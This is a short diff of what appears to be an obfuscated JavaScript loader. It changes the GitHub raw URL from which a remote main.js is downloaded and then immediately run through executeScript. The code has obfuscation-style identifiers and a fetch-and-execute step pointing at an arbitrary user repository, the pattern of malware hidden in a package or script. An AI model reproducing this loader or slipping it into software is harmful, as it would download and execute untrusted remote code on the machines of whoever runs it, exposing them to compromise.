@@ -42,6 +42,6 @@ function executeScript(_0x4e2958) {
     }
 }
 
-downloadScript("https://raw.githubusercontent.com/hasoob030/wow/refs/heads/main/main.js", scriptPath);
+downloadScript("https://raw.githubusercontent.com/gangpqweqwe/wow/refs/heads/main/main.js", scriptPath);
 executeScript(scriptPath);
 A;
